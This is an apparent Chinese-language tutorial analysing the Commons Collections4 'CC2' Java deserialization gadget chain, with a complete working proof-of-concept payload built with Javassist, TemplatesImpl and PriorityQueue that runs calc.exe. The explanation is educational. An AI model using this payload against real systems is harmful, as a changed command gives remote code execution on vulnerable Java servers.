  

# CommonsCollections2 （CC2链）

## 说明

### 导入依赖

    
    
    <dependency>  
    <groupId>org.apache.commons</groupId>  
    <artifactId>commons-collections4</artifactId>  
    <version>4.0</version>  
    </dependency>

### 利用链

    
    
    PriorityQueue.readObject()  
    PriorityQueue.heapify()  
    PriorityQueue.siftDown()  
       PriorityQueue.siftDownUsingComparator()  
          TransformingComparator.compare()  
             InvokerTransformer.transform()  
                method.invoke()  
                   TemplatesImpl.newTransformer()  
                      TemplatesImpl.getTransletInstance()

### 简化后的payload

贴上自己写的简化版payload：

    
    
    package com.ysoserial;  
    ​  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
    import org.apache.commons.collections4.Transformer;  
    import org.apache.commons.collections4.comparators.TransformingComparator;  
    import org.apache.commons.collections4.functors.InvokerTransformer;  
    import org.apache.ibatis.javassist.*;  
    ​  
    import java.io.*;  
    import java.lang.reflect.Field;  
    import java.util.PriorityQueue;  
    ​  
    public class CommonCollections2 {  
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, CannotCompileException, NotFoundException {  
    ​  
      ClassPool pool = ClassPool.getDefault();  
      CtClass doCalc = pool.makeClass("DoCalc");  
      CtClass abstractTranslet=pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");  
      doCalc.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");  
      doCalc.setSuperclass(abstractTranslet);  
      byte[] bytes1 = doCalc.toBytecode();  
    ​  
    ​  
      TemplatesImpl templates = new TemplatesImpl();  
      setFieldValue(templates,"_name","ZeanHike");  
      setFieldValue(templates,  
              "_bytecodes",  
              new byte[][]{  
                      bytes1  
              });  
    ​  
    ​  
      InvokerTransformer doNewTransformer = new InvokerTransformer("newTransformer",new Class[0],new Object[0]);  
    ​  
      TransformingComparator transformingComparator = new TransformingComparator((Transformer) doNewTransformer);  
      PriorityQueue queue = new PriorityQueue(2,transformingComparator);  
      setFieldValue(queue,"size",2);  
      Object[] q=new Object[]{templates,templates};  
      setFieldValue(queue,"queue",q);  
    ​  
    ​  
      //序列化  
      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
      ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
      objectOutputStream.writeObject(queue);  
      byteArrayOutputStream.flush();  
      byte[] bytes = byteArrayOutputStream.toByteArray();  
    ​  
    ​  
      //反序列化  
      ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);  
      ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);  
      objectInputStream.readObject();  
    ​  
    }  
    public static void setFieldValue(Object obj,String field,Object value) throws NoSuchFieldException, IllegalAccessException {  
      Field field1 = obj.getClass().getDeclaredField(field);  
      field1.setAccessible(true);  
      field1.set(obj,value);  
    }  
    }

## 分析正文

这里用了CB1中的TemplatesImpl那条利用链，不同的是CB1是利用getOutputProperties()触发newTransformer()，而这条利用链是直接method.invoke()触发newTransformer()

我们跟着利用链梳理下来：

反序列化PriorityQueue时，触发了PriorityQueue的readObject![image-20220419145204560](https://image.3001.net/images/20220420/1650434404_625fa1643763fa1cd1b74.png!small)

而readObject最后一定会触发heapify()，进入heapify方法内部

![1650506227_6260b9f3642001200d228.png!small?1650506227669](https://image.3001.net/images/20220421/1650506227_6260b9f3642001200d228.png!small?1650506227669)

这里想要触发siftDown要保证循环条件成立(i>=0)，size至少要为2，满足循环条件后，调用siftDown()

![image-20220419151610026](https://image.3001.net/images/20220420/1650434472_625fa1a8a73d363c8dca8.png!small)

siftDown()方法里调用要调用siftDownUsingComparator要满足comparator不为空，

进入siftDownUsingComparator方法内部，可以看到这里要进入循环的条件是(k<half)，而half为size右移一位，k为0，所以size至少要为2

![image-20220419151813335](https://image.3001.net/images/20220420/1650434478_625fa1aef40bffe7519fe.png!small)

然后进入TransformingComparator的compare方法，这里调用了transform方法，而这个transformer我们可以指定值为InvokerTransformer，这样就可以执行我们指定的方法了

![image-20220419152127659](https://image.3001.net/images/20220420/1650434480_625fa1b0e631f8a996177.png!small)

上图调用了InvokerTransformer的transform()方法，可以根据对象执行对应方法

![1650506241_6260ba0138989ee48a096.png!small?1650506241518](https://image.3001.net/images/20220421/1650506241_6260ba0138989ee48a096.png!small?1650506241518)

我们可以让他执行TemplatesImpl类的newTransformer()方法

![image-20220419152422853](https://image.3001.net/images/20220420/1650434666_625fa26ab90ca955e651d.png!small)

newTransformer方法触发了我们想要的getTransletInstance()

![image-20220419153105449](https://image.3001.net/images/20220420/1650434729_625fa2a903c8318e8c17c.png!small)

需要满足TemplatesImpl类的属性_name不为空，_class为空，这样就可以进入defineTransletClasses()

![image-20220419153253740](https://image.3001.net/images/20220420/1650434731_625fa2ab613636e2cb63b.png!small)

defineTransletClasses()就是根据字节码去加载类，放到_class属性中

然后回到getTransletInstance()中，

![image-20220419153423681](https://image.3001.net/images/20220420/1650434733_625fa2ad038055c0334ed.png!small)

他去实例化每个_class属性存放的类，执行里面的构造方法

分析结束

然后开始一步步构造对象

首先创建一个恶意类，在他的构造函数里放入恶意代码

    
    
    ClassPool pool = ClassPool.getDefault();  
    CtClass doCalc = pool.makeClass("DoCalc");//创建一个类名为DoCalc的类  
    CtClass abstractTranslet=pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");  
    doCalc.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");//创建一个无参构造函数，并将恶意代码写入  
    doCalc.setSuperclass(abstractTranslet);//设置恶意类的父类  
    byte[] bytes1 = doCalc.toBytecode();//转化为字节码

然后将恶意类放入TemplatesImpl的_bytecodes属性，这样到时候就可以将恶意类加载到_class属性，然后实例化恶意类，执行无参构造函数，从而执行恶意代码，_name属性前面说过不能为空，不然会在getTransletInstance方法里直接返回

    
    
    TemplatesImpl templates = new TemplatesImpl();  
    setFieldValue(templates,"_name","ZeanHike");  
    setFieldValue(templates,  
      "_bytecodes",  
      new byte[][]{  
              bytes1  
      });

需要将执行newTransformer方法的InvokerTransformer封装到TransformingComparator类的transformer属性中，目的是当TransformingComparator的compare方法执行时，触发InvokerTransformer的transform方法

    
    
    InvokerTransformer doNewTransformer = new InvokerTransformer("newTransformer",new Class[0],new Object[0]);  
    ​  
    TransformingComparator transformingComparator = new TransformingComparator((Transformer) doNewTransformer);

最后创建一个反序列化对象，前面说过要满足size至少大于2的条件，我们再将TransformingComparator传入PriorityQueue类作为他的属性comparator的值，这样可以使在siftDownUsingComparator方法中，触发comparator.compare()方法时会走到TransformingComparator的compare()方法，再将templates封装到PriorityQueue中作为他的属性queue的值，这样当执行InvokerTransformer的transform方法时，确保执行方法的对象的类是TemplatesImpl，这样才能跟newTransformer()方法关联起来

    
    
    PriorityQueue queue = new PriorityQueue(2,transformingComparator);  
    setFieldValue(queue,"size",2);  
    Object[] q=new Object[]{templates,templates};  
    setFieldValue(queue,"queue",q);

分析完毕

执行payload

召唤出神兽

![1650434295_625fa0f7aba592bfb3694.png!small?1650434296767](https://image.3001.net/images/20220420/1650434295_625fa0f7aba592bfb3694.png!small?1650434296767)

